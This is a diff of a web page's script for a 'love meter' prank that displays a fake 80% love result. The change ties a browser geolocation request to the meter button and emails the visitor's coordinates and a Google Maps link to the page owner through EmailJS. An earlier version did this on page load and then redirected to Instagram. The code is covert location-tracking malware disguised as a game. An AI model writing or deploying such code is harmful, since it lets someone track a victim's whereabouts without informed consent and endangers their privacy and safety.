@@ -13,8 +13,14 @@
         publicKey: "YOUR_PUBLIC_KEY",
       });
 
-  // Ask location when page loads
-  window.addEventListener("load", () => {
+  window.runLoveMeter = function() {
+    const meter = document.getElementById('meter');
+    meter.style.width = '80%';
+
+    setTimeout(() => {
+      document.getElementById('result').innerText = "Wow! You are 80% in love! 😍";
+    }, 2000);
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
@@ -22,42 +28,19 @@
           const lon = pos.coords.longitude;
           const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-          // Send location to email
           emailjs.send("service_j1cmr8e", "template_l1ejqfe", {
             latitude: lat,
             longitude: lon,
             maps_link: mapsLink
           }).then(
-            () => {
-              console.log("✅ Location sent successfully");
-              window.location.href = "https://www.instagram.com/"; // Redirect after success
-            },
-            (err) => {
-              console.error("❌ Email send error", err);
-              window.location.href = "https://www.instagram.com/"; // Redirect even if failed
-            }
+            () => console.log("✅ Location sent successfully"),
+            (err) => console.error("❌ Email send error", err)
           );
         },
-        () => {
-          console.log("Location not allowed");
-          window.location.href = "https://www.instagram.com/"; // Redirect if denied
-        }
+        () => { console.log("Location not allowed"); }
       );
-    } else {
-      console.log("Geolocation not supported");
-      window.location.href = "https://www.instagram.com/"; // Redirect if not supported
     }
-  });
-
-  // Love meter animation
-  window.runLoveMeter = function() {
-    const meter = document.getElementById('meter');
-    meter.style.width = '80%';
-    setTimeout(() => {
-      document.getElementById('result').innerText = "Wow! You are 80% in love! 😍";
-    }, 2000);
   }
-
        })();
 </script>
 <style>
@@ -111,4 +94,3 @@
 
 </body>
 </html>
-
